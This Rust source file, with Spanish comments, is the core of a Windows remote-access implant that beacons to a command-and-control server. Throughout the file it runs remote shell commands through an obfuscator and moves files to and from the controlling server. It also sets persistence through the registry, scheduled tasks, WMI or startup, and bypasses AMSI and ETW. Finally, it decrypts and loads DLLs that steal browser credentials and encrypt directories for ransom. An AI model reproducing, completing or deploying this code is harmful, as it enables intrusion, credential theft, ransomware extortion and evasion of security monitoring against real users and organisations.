#![windows_subsystem = "console"]

mod config;
mod evasion;
mod syscalls;
mod persistence;
mod beacon;
mod argfuscator;

#[cfg(target_os = "windows")]
use std::ffi::CStr;
use std::io::{BufRead, BufReader, Write};
use std::net::TcpStream;
use std::process::Command;
use std::thread;
use std::time::Duration;
use std::fs;
use std::path::Path;

const DELIMITER: &str = "\n<<END>>\n";

fn main() {
    println!("DEBUG: C2R2 Agent v2.0 - Beacon Mode");
    println!("DEBUG: Conectando a {}", config::C2_SERVER);
    
    // Configuración de beacon (60s con 30% jitter por defecto)
    let beacon_config = beacon::BeaconConfig::default();
    let mut retry_count = 0;
    
    loop {
        match TcpStream::connect(config::C2_SERVER) {
            Ok(stream) => {
                println!("DEBUG: Conectado al servidor C2");
                retry_count = 0; // Reset retry counter on successful connection
                handle_connection(stream, &beacon_config);
                println!("DEBUG: Conexión cerrada");
            }
            Err(e) => {
                println!("DEBUG: Error de conexión: {}", e);
            }
        }
        
        // Calcular intervalo de retry con exponential backoff
        let retry_interval = beacon::calculate_retry_interval(&beacon_config, retry_count);
        println!("DEBUG: Reintentando en {} segundos...", retry_interval.as_secs());
        beacon::beacon_sleep(retry_interval);
        retry_count += 1;
    }
}

fn handle_connection(stream: TcpStream, _beacon_config: &beacon::BeaconConfig) {
    let mut reader = BufReader::new(stream.try_clone().unwrap());
    let mut writer = stream;

    // Enviar información del sistema de una vez (blocking)
    send_sysinfo(&mut writer);

    let mut buffer = String::new();
    loop {
        match reader.read_line(&mut buffer) {
            Ok(0) => break,
            Ok(_) => {
                let command = buffer.trim();
                println!("DEBUG: Comando recibido: {}", command);

                if command.starts_with("__PERSIST__:") {
                    // Comando de persistencia: __PERSIST__:registry|task|wmi|startup
                    let method = command.strip_prefix("__PERSIST__:").unwrap_or("");
                    println!("DEBUG: Estableciendo persistencia: {}", method);
                    let response = handle_persistence(method);
                    writer.write_all(response.as_bytes()).ok();
                    writer.flush().ok();
                } else if command == "__PERSIST_REMOVE__" {
                    // Comando para remover persistencia
                    println!("DEBUG: Removiendo persistencia");
                    let response = handle_persistence_remove();
                    writer.write_all(response.as_bytes()).ok();
                    writer.flush().ok();
                } else if command.starts_with("__BEACON__:") {
                    // Comando para cambiar configuración de beacon: __BEACON__:60:30
                    let config_str = command.strip_prefix("__BEACON__:").unwrap_or("");
                    println!("DEBUG: Cambiando configuración beacon: {}", config_str);
                    let response = format!("__INFO__:Configuración de beacon recibida (se aplicará en próxima reconexión): {}{}", config_str, DELIMITER);
                    writer.write_all(response.as_bytes()).ok();
                    writer.flush().ok();
                    // Nota: la configuración real se aplicaría guardándola en un archivo
                    // pero para mantener simplicidad, solo informamos
                } else if command.starts_with("__DOWNLOAD__:") {
                    // Formato: __DOWNLOAD__:ruta_del_archivo
                    let path = command.strip_prefix("__DOWNLOAD__:").unwrap_or("");
                    println!("DEBUG: Descargando archivo: {}", path);
                    let response = download_file(path);
                    writer.write_all(response.as_bytes()).ok();
                    writer.flush().ok();
                } else if command.starts_with("__UPLOAD__|") {
                    // Formato: __UPLOAD__|ruta_destino|datos_base64
                    println!("DEBUG: Procesando upload...");
                    let response = upload_file(command);
                    writer.write_all(response.as_bytes()).ok();
                    writer.flush().ok();
                } else if command == "__HARVEST__" {
                    // Comando para robar credenciales usando DLL encriptada
                    println!("DEBUG: Harvesting credenciales...");
                    let response = harvest_credentials();
                    writer.write_all(response.as_bytes()).ok();
                    writer.flush().ok();
                } else if command.starts_with("__ENCRYPT__:") {
                    // Comando para encriptar archivos: __ENCRYPT__:ruta|max_depth
                    let params = command.strip_prefix("__ENCRYPT__:").unwrap_or("");
                    println!("DEBUG: Encrypting files: {}", params);
                    let response = encrypt_files(params);
                    writer.write_all(response.as_bytes()).ok();
                    writer.flush().ok();
                } else if command.starts_with("__DECRYPT__:") {
                    // Comando para desencriptar archivos: __DECRYPT__:ruta|key|max_depth
                    let params = command.strip_prefix("__DECRYPT__:").unwrap_or("");
                    println!("DEBUG: Decrypting files: {}", params);
                    let response = decrypt_files(params);
                    writer.write_all(response.as_bytes()).ok();
                    writer.flush().ok();
                } else if !command.is_empty() {
                    let output = execute_command(command);
                    let response = format!("{}{}", output, DELIMITER);
                    writer.write_all(response.as_bytes()).ok();
                    writer.flush().ok();
                }
                buffer.clear();
            }
            Err(_) => break,
        }
    }
}

fn send_sysinfo(writer: &mut TcpStream) {
    println!("DEBUG: Recopilando información del sistema...");
    
    // Recopilar toda la información de una vez
    let hostname = get_system_info("hostname");
    let username = get_system_info("username");
    let os = get_system_info("os");
    let privileges = get_system_info("privileges");
    
    // Enviar todo de una vez
    let sysinfo = format!(
        "__SYSINFO__:hostname:{}\n__SYSINFO__:username:{}\n__SYSINFO__:os:{}\n__SYSINFO__:privileges:{}\n",
        hostname, username, os, privileges
    );
    
    println!("DEBUG: Enviando información del sistema...");
    writer.write_all(sysinfo.as_bytes()).ok();
    writer.flush().ok();
    println!("DEBUG: Información enviada");
}

fn get_system_info(info_type: &str) -> String {
    let output = match info_type {
        "hostname" => Command::new("hostname").output(),
        "username" => Command::new("cmd").args(&["/C", "echo %USERNAME%"]).output(),
        "os" => Command::new("cmd").args(&["/C", "ver"]).output(),
        "privileges" => Command::new("cmd")
            .args(&["/C", "net session >nul 2>&1 && echo Admin || echo User"])
            .output(),
        _ => return String::new(),
    };

    match output {
        Ok(out) => String::from_utf8_lossy(&out.stdout).trim().to_string(),
        Err(_) => "Unknown".to_string(),
    }
}

fn execute_command(command: &str) -> String {
    // Apply command obfuscation
    let obfuscated_cmd = argfuscator::obfuscate(command);
    println!("DEBUG: Comando original: {}", command);
    println!("DEBUG: Comando ofuscado: {}", obfuscated_cmd);
    
    let output = Command::new("cmd").args(&["/C", &obfuscated_cmd]).output();
    match output {
        Ok(out) => {
            let stdout = String::from_utf8_lossy(&out.stdout);
            let stderr = String::from_utf8_lossy(&out.stderr);
            format!("{}{}", stdout, stderr)
        }
        Err(e) => format!("Error: {}", e),
    }
}

fn download_file(file_path: &str) -> String {
    println!("DEBUG: Intentando leer archivo: {}", file_path);
    
    match fs::read(file_path) {
        Ok(file_data) => {
            let encoded = base64_encode(&file_data);
            let file_name = Path::new(file_path)
                .file_name()
                .and_then(|n| n.to_str())
                .unwrap_or("unknown");
            
            println!("DEBUG: Archivo leído, {} bytes", file_data.len());
            format!("__FILE__:{}:{}:{}{}", file_name, file_data.len(), encoded, DELIMITER)
        }
        Err(e) => {
            println!("DEBUG: Error leyendo archivo: {}", e);
            format!("__ERROR__:No se pudo leer el archivo: {}{}", e, DELIMITER)
        }
    }
}

fn upload_file(command: &str) -> String {
    // Formato: __UPLOAD__|ruta_destino|datos_base64
    let parts: Vec<&str> = command.splitn(3, '|').collect();
    
    if parts.len() != 3 {
        return format!("__ERROR__:Formato de upload inválido{}", DELIMITER);
    }
    
    let dest_path = parts[1];
    let encoded_data = parts[2].trim(); // TRIM para eliminar \n y espacios
    
    println!("DEBUG: Decodificando {} bytes de base64", encoded_data.len());
    println!("DEBUG: Ruta destino: {}", dest_path);
    
    match base64_decode(encoded_data) {
        Ok(file_data) => {
            println!("DEBUG: Escribiendo {} bytes a {}", file_data.len(), dest_path);
            match fs::write(dest_path, file_data) {
                Ok(_) => {
                    println!("DEBUG: Archivo guardado exitosamente");
                    format!("__SUCCESS__:Archivo guardado en {}{}", dest_path, DELIMITER)
                }
                Err(e) => {
                    println!("DEBUG: Error guardando archivo: {}", e);
                    format!("__ERROR__:Error guardando archivo: {}{}", e, DELIMITER)
                }
            }
        }
        Err(e) => {
            println!("DEBUG: Error decodificando base64: {}", e);
            format!("__ERROR__:Error decodificando datos: {}{}", e, DELIMITER)
        }
    }
}

// Implementación simple de base64 encode/decode sin dependencias
fn base64_encode(data: &[u8]) -> String {
    const CHARS: &[u8] = b"ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/";
    let mut result = String::new();
    
    for chunk in data.chunks(3) {
        let mut buf = [0u8; 3];
        for (i, &byte) in chunk.iter().enumerate() {
            buf[i] = byte;
        }
        
        let b1 = (buf[0] >> 2) & 0x3F;
        let b2 = ((buf[0] & 0x03) << 4) | ((buf[1] >> 4) & 0x0F);
        let b3 = ((buf[1] & 0x0F) << 2) | ((buf[2] >> 6) & 0x03);
        let b4 = buf[2] & 0x3F;
        
        result.push(CHARS[b1 as usize] as char);
        result.push(CHARS[b2 as usize] as char);
        result.push(if chunk.len() > 1 { CHARS[b3 as usize] as char } else { '=' });
        result.push(if chunk.len() > 2 { CHARS[b4 as usize] as char } else { '=' });
    }
    
    result
}

fn base64_decode(data: &str) -> Result<Vec<u8>, String> {
    let data = data.trim();
    let mut result = Vec::new();
    
    let decode_char = |c: char| -> Result<u8, String> {
        match c {
            'A'..='Z' => Ok(c as u8 - b'A'),
            'a'..='z' => Ok(c as u8 - b'a' + 26),
            '0'..='9' => Ok(c as u8 - b'0' + 52),
            '+' => Ok(62),
            '/' => Ok(63),
            '=' => Ok(0),
            _ => Err(format!("Carácter inválido en base64: {}", c)),
        }
    };
    
    let chars: Vec<char> = data.chars().collect();
    for chunk in chars.chunks(4) {
        if chunk.len() != 4 {
            continue;
        }
        
        let b1 = decode_char(chunk[0])?;
        let b2 = decode_char(chunk[1])?;
        let b3 = decode_char(chunk[2])?;
        let b4 = decode_char(chunk[3])?;
        
        result.push((b1 << 2) | (b2 >> 4));
        if chunk[2] != '=' {
            result.push((b2 << 4) | (b3 >> 2));
        }
        if chunk[3] != '=' {
            result.push((b3 << 6) | b4);
        }
    }
    
    Ok(result)
}

/// Roba credenciales de browsers usando DLL encriptada
/// El servidor ya subió stealer.enc y stealer.key con /upload
/// Ahora solo cargamos, desencriptamos y ejecutamos
fn harvest_credentials() -> String {
    println!("DEBUG: Harvesting credentials...");
    
    #[cfg(not(target_os = "windows"))]
    {
        return format!("__ERROR__:Harvest solo soportado en Windows{}", DELIMITER);
    }
    
    #[cfg(target_os = "windows")]
    {
        // Verificar que existan los archivos subidos
        if !Path::new("stealer.enc").exists() {
            return format!("__ERROR__:stealer.enc no encontrado. El servidor debe subirlo primero.{}", DELIMITER);
        }
        
        if !Path::new("stealer.key").exists() {
            return format!("__ERROR__:stealer.key no encontrado. El servidor debe subirlo primero.{}", DELIMITER);
        }
        
        // Leer archivos
        let encrypted_dll = match fs::read("stealer.enc") {
            Ok(data) => data,
            Err(e) => return format!("__ERROR__:Error leyendo stealer.enc: {}{}", e, DELIMITER),
        };
        
        let xor_key = match fs::read("stealer.key") {
            Ok(data) => data,
            Err(e) => return format!("__ERROR__:Error leyendo stealer.key: {}{}", e, DELIMITER),
        };
        
        println!("DEBUG: DLL encriptada: {} bytes", encrypted_dll.len());
        println!("DEBUG: Clave XOR: {} bytes", xor_key.len());
        
        // Desencriptar DLL
        let dll_bytes = xor_decrypt(&encrypted_dll, &xor_key);
        println!("DEBUG: DLL desencriptada: {} bytes", dll_bytes.len());
        
        // === EVASIÓN AGRESIVA ===
        println!("DEBUG: [EVASION] Bypassing AMSI...");
        unsafe {
            if evasion::bypass_amsi() {
                println!("DEBUG: [EVASION] ✅ AMSI bypassed");
            } else {
                println!("DEBUG: [EVASION] ⚠️ AMSI bypass failed (puede no estar disponible)");
            }
            
            println!("DEBUG: [EVASION] Bypassing ETW...");
            if evasion::bypass_etw() {
                println!("DEBUG: [EVASION] ✅ ETW bypassed");
            } else {
                println!("DEBUG: [EVASION] ⚠️ ETW bypass failed");
            }
        }
        
        // SIMPLIFICADO: LoadLibrary directo (más confiable)
        use std::os::raw::c_char;
        use winapi::um::libloaderapi::{LoadLibraryA, GetProcAddress, FreeLibrary};
        use std::ffi::CString;
        
        // Crear archivo temporal con nombre random
        let temp_dir = std::env::temp_dir();
        let random_name = format!("~tmp{}.tmp", std::process::id());
        let dll_path = temp_dir.join(random_name);
        
        println!("DEBUG: [EVASION] Writing DLL to temp: {}", dll_path.display());
        if let Err(e) = std::fs::write(&dll_path, &dll_bytes) {
            return format!("__ERROR__:Failed to write DLL: {}{}", e, DELIMITER);
        }
        
        let result = unsafe {
            // LoadLibrary
            let path_cstring = CString::new(dll_path.to_str().unwrap()).unwrap();
            let h_module = LoadLibraryA(path_cstring.as_ptr());
            
            if h_module.is_null() {
                let _ = std::fs::remove_file(&dll_path);
                return format!("__ERROR__:LoadLibrary failed{}", DELIMITER);
            }
            
            println!("DEBUG: [EVASION] ✅ DLL loaded at: {:p}", h_module);
            
            // GetProcAddress
            let fn_name = CString::new("steal_credentials").unwrap();
            let fn_ptr = GetProcAddress(h_module, fn_name.as_ptr());
            
            if fn_ptr.is_null() {
                FreeLibrary(h_module);
                let _ = std::fs::remove_file(&dll_path);
                return format!("__ERROR__:steal_credentials not found{}", DELIMITER);
            }
            
            println!("DEBUG: [EVASION] ✅ Function found, executing...");
            
            // Ejecutar función CON PROTECCIÓN CONTRA CRASHES
            println!("DEBUG: [EVASION] Calling steal_credentials()...");
            let exec_fn: extern "C" fn() -> *mut c_char = std::mem::transmute(fn_ptr);
            let result_ptr = exec_fn();
            println!("DEBUG: [EVASION] steal_credentials() returned: {:p}", result_ptr);
            
            if result_ptr.is_null() {
                FreeLibrary(h_module);
                let _ = std::fs::remove_file(&dll_path);
                return format!("__ERROR__:steal_credentials returned NULL{}", DELIMITER);
            }
            
            // Leer resultado
            let result_str = CStr::from_ptr(result_ptr).to_string_lossy().to_string();
            
            // Liberar memoria - buscar función free_credentials_string
            let free_fn_name = CString::new("free_credentials_string").unwrap();
            let free_ptr = GetProcAddress(h_module, free_fn_name.as_ptr());
            if !free_ptr.is_null() {
                let free_fn: extern "C" fn(*mut c_char) = std::mem::transmute(free_ptr);
                free_fn(result_ptr);
            }
            
            // Limpiar
            FreeLibrary(h_module);
            let _ = std::fs::remove_file(&dll_path);
            
            result_str
        };
        
        // Eliminar archivos del módulo
        fs::remove_file("stealer.enc").ok();
        fs::remove_file("stealer.key").ok();
        
        println!("DEBUG: Resultado obtenido: {} bytes", result.len());
        
        // Verificar si hubo error
        if result.starts_with("ERROR:") {
            return format!("__ERROR__:{}{}", result, DELIMITER);
        }
        
        // Codificar en Base64 y enviar
        let encoded = base64_encode(result.as_bytes());
        format!("__CREDENTIALS_B64__:{}{}", encoded, DELIMITER)
    }
}

/// Desencripta datos con XOR
fn xor_decrypt(data: &[u8], key: &[u8]) -> Vec<u8> {
    data.iter()
        .enumerate()
        .map(|(i, &byte)| byte ^ key[i % key.len()])
        .collect()
}

/// Maneja el comando de persistencia
fn handle_persistence(method_str: &str) -> String {
    let method = match persistence::PersistenceMethod::from_str(method_str) {
        Some(m) => m,
        None => {
            return format!(
                "__ERROR__:Método de persistencia inválido. Usar: registry|task|wmi|startup{}",
                DELIMITER
            );
        }
    };
    
    match persistence::establish_persistence(method) {
        Ok(msg) => {
            println!("DEBUG: [PERSISTENCE] ✅ {}", msg);
            format!("__SUCCESS__:{}{}", msg, DELIMITER)
        }
        Err(e) => {
            println!("DEBUG: [PERSISTENCE] ❌ Error: {}", e);
            format!("__ERROR__:Error estableciendo persistencia: {}{}", e, DELIMITER)
        }
    }
}

/// Maneja el comando de remoción de persistencia
fn handle_persistence_remove() -> String {
    match persistence::remove_persistence() {
        Ok(msg) => {
            println!("DEBUG: [PERSISTENCE] ✅ Limpieza: {}", msg);
            format!("__SUCCESS__:Persistencia removida: {}{}", msg, DELIMITER)
        }
        Err(e) => {
            println!("DEBUG: [PERSISTENCE] ❌ Error limpieza: {}", e);
            format!("__ERROR__:Error removiendo persistencia: {}{}", e, DELIMITER)
        }
    }
}

/// Encripta archivos usando la DLL de ransomware
/// Parámetros: ruta:max_depth
fn encrypt_files(params: &str) -> String {
    println!("DEBUG: Encrypting files with params: {}", params);
    
    #[cfg(not(target_os = "windows"))]
    {
        return format!("__ERROR__:Ransomware solo soportado en Windows{}", DELIMITER);
    }
    
    #[cfg(target_os = "windows")]
    {
        let parts: Vec<&str> = params.split('|').collect();
        if parts.len() < 2 {
            return format!("__ERROR__:Parámetros inválidos. Uso: __ENCRYPT__:ruta|max_depth{}", DELIMITER);
        }
        
        let path = parts[0].trim();
        let max_depth: u32 = parts[1].trim().parse().unwrap_or(5);
        
        println!("DEBUG: encrypt_files - path='{}', max_depth={}", path, max_depth);
        
        // Verificar que existan los archivos subidos
        if !Path::new("ransomware.enc").exists() {
            return format!("__ERROR__:ransomware.enc no encontrado. El servidor debe subirlo primero.{}", DELIMITER);
        }
        
        if !Path::new("ransomware.key").exists() {
            return format!("__ERROR__:ransomware.key no encontrado. El servidor debe subirlo primero.{}", DELIMITER);
        }
        
        // Leer archivos
        let encrypted_dll = match fs::read("ransomware.enc") {
            Ok(data) => data,
            Err(e) => return format!("__ERROR__:Error leyendo ransomware.enc: {}{}", e, DELIMITER),
        };
        
        let xor_key = match fs::read("ransomware.key") {
            Ok(data) => data,
            Err(e) => return format!("__ERROR__:Error leyendo ransomware.key: {}{}", e, DELIMITER),
        };
        
        println!("DEBUG: DLL encriptada: {} bytes", encrypted_dll.len());
        println!("DEBUG: Clave XOR: {} bytes", xor_key.len());
        
        // Desencriptar DLL
        let dll_bytes = xor_decrypt(&encrypted_dll, &xor_key);
        println!("DEBUG: DLL desencriptada: {} bytes", dll_bytes.len());
        
        // Evasión
        println!("DEBUG: [EVASION] Bypassing AMSI...");
        unsafe {
            if evasion::bypass_amsi() {
                println!("DEBUG: [EVASION] ✅ AMSI bypassed");
            } else {
                println!("DEBUG: [EVASION] ⚠️ AMSI bypass failed");
            }
            
            println!("DEBUG: [EVASION] Bypassing ETW...");
            if evasion::bypass_etw() {
                println!("DEBUG: [EVASION] ✅ ETW bypassed");
            } else {
                println!("DEBUG: [EVASION] ⚠️ ETW bypass failed");
            }
        }
        
        // Cargar DLL
        use std::os::raw::c_char;
        use winapi::um::libloaderapi::{LoadLibraryA, GetProcAddress, FreeLibrary};
        use std::ffi::CString;
        
        let temp_dir = std::env::temp_dir();
        let random_name = format!("~tmp{}.tmp", std::process::id());
        let dll_path = temp_dir.join(random_name);
        
        println!("DEBUG: [EVASION] Writing DLL to temp: {}", dll_path.display());
        if let Err(e) = std::fs::write(&dll_path, &dll_bytes) {
            return format!("__ERROR__:Failed to write DLL: {}{}", e, DELIMITER);
        }
        
        let result = unsafe {
            let path_cstring = CString::new(dll_path.to_str().unwrap()).unwrap();
            let h_module = LoadLibraryA(path_cstring.as_ptr());
            
            if h_module.is_null() {
                let _ = std::fs::remove_file(&dll_path);
                return format!("__ERROR__:LoadLibrary failed{}", DELIMITER);
            }
            
            println!("DEBUG: [EVASION] ✅ DLL loaded at: {:p}", h_module);
            
            let fn_name = CString::new("encrypt_directory").unwrap();
            let fn_ptr = GetProcAddress(h_module, fn_name.as_ptr());
            
            if fn_ptr.is_null() {
                FreeLibrary(h_module);
                let _ = std::fs::remove_file(&dll_path);
                return format!("__ERROR__:encrypt_directory not found{}", DELIMITER);
            }
            
            println!("DEBUG: [EVASION] ✅ Function found, executing...");
            
            // Ejecutar función
            let path_c = CString::new(path).unwrap();
            let exec_fn: extern "C" fn(*const c_char, u32) -> *mut c_char = std::mem::transmute(fn_ptr);
            let result_ptr = exec_fn(path_c.as_ptr(), max_depth);
            
            if result_ptr.is_null() {
                FreeLibrary(h_module);
                let _ = std::fs::remove_file(&dll_path);
                return format!("__ERROR__:encrypt_directory returned NULL{}", DELIMITER);
            }
            
            let result_str = CStr::from_ptr(result_ptr).to_string_lossy().to_string();
            
            // Liberar memoria
            let free_fn_name = CString::new("free_string").unwrap();
            let free_ptr = GetProcAddress(h_module, free_fn_name.as_ptr());
            if !free_ptr.is_null() {
                let free_fn: extern "C" fn(*mut c_char) = std::mem::transmute(free_ptr);
                free_fn(result_ptr);
            }
            
            FreeLibrary(h_module);
            let _ = std::fs::remove_file(&dll_path);
            
            result_str
        };
        
        // Eliminar archivos del módulo
        fs::remove_file("ransomware.enc").ok();
        fs::remove_file("ransomware.key").ok();
        
        println!("DEBUG: Resultado obtenido: {}", result);
        
        // Verificar si hubo error
        if result.starts_with("ERROR:") {
            return format!("__ERROR__:{}{}", result, DELIMITER);
        }
        
        format!("__RANSOMWARE__:{}{}", result, DELIMITER)
    }
}

/// Desencripta archivos usando la DLL de ransomware
/// Parámetros: ruta:key:max_depth
fn decrypt_files(params: &str) -> String {
    println!("DEBUG: Decrypting files with params: {}", params);
    
    #[cfg(not(target_os = "windows"))]
    {
        return format!("__ERROR__:Ransomware solo soportado en Windows{}", DELIMITER);
    }
    
    #[cfg(target_os = "windows")]
    {
        let parts: Vec<&str> = params.split('|').collect();
        if parts.len() < 3 {
            return format!("__ERROR__:Parámetros inválidos. Uso: __DECRYPT__:ruta|key|max_depth{}", DELIMITER);
        }
        
        let path = parts[0].trim();
        let key_hex = parts[1].trim();
        let max_depth: u32 = parts[2].trim().parse().unwrap_or(5);
        
        println!("DEBUG: decrypt_files - path='{}', key_hex='{}', max_depth={}", path, key_hex, max_depth);
        
        // Verificar que existan los archivos subidos
        if !Path::new("ransomware.enc").exists() {
            return format!("__ERROR__:ransomware.enc no encontrado. El servidor debe subirlo primero.{}", DELIMITER);
        }
        
        if !Path::new("ransomware.key").exists() {
            return format!("__ERROR__:ransomware.key no encontrado. El servidor debe subirlo primero.{}", DELIMITER);
        }
        
        // Leer archivos
        let encrypted_dll = match fs::read("ransomware.enc") {
            Ok(data) => data,
            Err(e) => return format!("__ERROR__:Error leyendo ransomware.enc: {}{}", e, DELIMITER),
        };
        
        let xor_key = match fs::read("ransomware.key") {
            Ok(data) => data,
            Err(e) => return format!("__ERROR__:Error leyendo ransomware.key: {}{}", e, DELIMITER),
        };
        
        println!("DEBUG: DLL encriptada: {} bytes", encrypted_dll.len());
        
        // Desencriptar DLL
        let dll_bytes = xor_decrypt(&encrypted_dll, &xor_key);
        println!("DEBUG: DLL desencriptada: {} bytes", dll_bytes.len());
        
        // Evasión
        unsafe {
            evasion::bypass_amsi();
            evasion::bypass_etw();
        }
        
        // Cargar DLL
        use std::os::raw::c_char;
        use winapi::um::libloaderapi::{LoadLibraryA, GetProcAddress, FreeLibrary};
        use std::ffi::CString;
        
        let temp_dir = std::env::temp_dir();
        let random_name = format!("~tmp{}.tmp", std::process::id());
        let dll_path = temp_dir.join(random_name);
        
        if let Err(e) = std::fs::write(&dll_path, &dll_bytes) {
            return format!("__ERROR__:Failed to write DLL: {}{}", e, DELIMITER);
        }
        
        let result = unsafe {
            let path_cstring = CString::new(dll_path.to_str().unwrap()).unwrap();
            let h_module = LoadLibraryA(path_cstring.as_ptr());
            
            if h_module.is_null() {
                let _ = std::fs::remove_file(&dll_path);
                return format!("__ERROR__:LoadLibrary failed{}", DELIMITER);
            }
            
            let fn_name = CString::new("decrypt_directory").unwrap();
            let fn_ptr = GetProcAddress(h_module, fn_name.as_ptr());
            
            if fn_ptr.is_null() {
                FreeLibrary(h_module);
                let _ = std::fs::remove_file(&dll_path);
                return format!("__ERROR__:decrypt_directory not found{}", DELIMITER);
            }
            
            // Ejecutar función
            let path_c = CString::new(path).unwrap();
            let key_c = CString::new(key_hex).unwrap();
            let exec_fn: extern "C" fn(*const c_char, *const c_char, u32) -> *mut c_char = std::mem::transmute(fn_ptr);
            let result_ptr = exec_fn(path_c.as_ptr(), key_c.as_ptr(), max_depth);
            
            if result_ptr.is_null() {
                FreeLibrary(h_module);
                let _ = std::fs::remove_file(&dll_path);
                return format!("__ERROR__:decrypt_directory returned NULL{}", DELIMITER);
            }
            
            let result_str = CStr::from_ptr(result_ptr).to_string_lossy().to_string();
            
            // Liberar memoria
            let free_fn_name = CString::new("free_string").unwrap();
            let free_ptr = GetProcAddress(h_module, free_fn_name.as_ptr());
            if !free_ptr.is_null() {
                let free_fn: extern "C" fn(*mut c_char) = std::mem::transmute(free_ptr);
                free_fn(result_ptr);
            }
            
            FreeLibrary(h_module);
            let _ = std::fs::remove_file(&dll_path);
            
            result_str
        };
        
        // Eliminar archivos del módulo
        fs::remove_file("ransomware.enc").ok();
        fs::remove_file("ransomware.key").ok();
        
        println!("DEBUG: Resultado obtenido: {}", result);
        
        // Verificar si hubo error
        if result.starts_with("ERROR:") {
            return format!("__ERROR__:{}{}", result, DELIMITER);
        }
        
        format!("__RANSOMWARE__:{}{}", result, DELIMITER)
    }
}

